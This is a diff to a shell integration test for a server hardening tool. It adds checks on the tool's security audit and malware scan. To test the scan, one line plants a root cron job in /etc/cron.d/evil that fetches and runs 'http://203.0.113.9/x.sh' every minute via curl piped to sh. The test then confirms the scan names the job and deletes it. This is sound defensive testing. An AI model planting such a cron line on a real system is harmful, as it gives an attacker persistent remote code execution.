@@ -105,6 +105,20 @@ docker run --rm "$img" ssh "${opts[@]}" -o PubkeyAuthentication=no -p 40022 "adm
 rm -f /tmp/si-key-$$
 sx passwd -S root | has " L " || fail "root password not locked"
 
+step "security audit finds no problems after the setup"
+sx server-init audit >/tmp/audit.out || { cat /tmp/audit.out; fail "audit"; }
+grep -q "Root login: disabled" /tmp/audit.out || { cat /tmp/audit.out; fail "audit: root login"; }
+grep -q "Password login: keys only" /tmp/audit.out || { cat /tmp/audit.out; fail "audit: password login"; }
+grep -q "Firewall: ufw is active" /tmp/audit.out || { cat /tmp/audit.out; fail "audit: firewall"; }
+
+step "malware scan finds nothing"
+sx server-init scan >/tmp/scan.out || { cat /tmp/scan.out; fail "scan"; }
+grep -q "Changed system programs: all programs match" /tmp/scan.out || { cat /tmp/scan.out; fail "scan: dpkg --verify"; }
+sx sh -c "echo '* * * * * root curl -s http://203.0.113.9/x.sh | sh' >/etc/cron.d/evil"
+sx server-init scan >/tmp/scan.out && fail "scan must report the planted cron job"
+grep -q "/etc/cron.d/evil" /tmp/scan.out || { cat /tmp/scan.out; fail "scan: cron job not named"; }
+sx rm /etc/cron.d/evil
+
 step "rerun is a no-op"
 sx server-init --config /root/answers.yaml --yes >/tmp/rerun.out || { cat /tmp/rerun.out; fail "rerun"; }
 grep -q "Everything is already applied" /tmp/rerun.out || { cat /tmp/rerun.out; fail "rerun changed something"; }
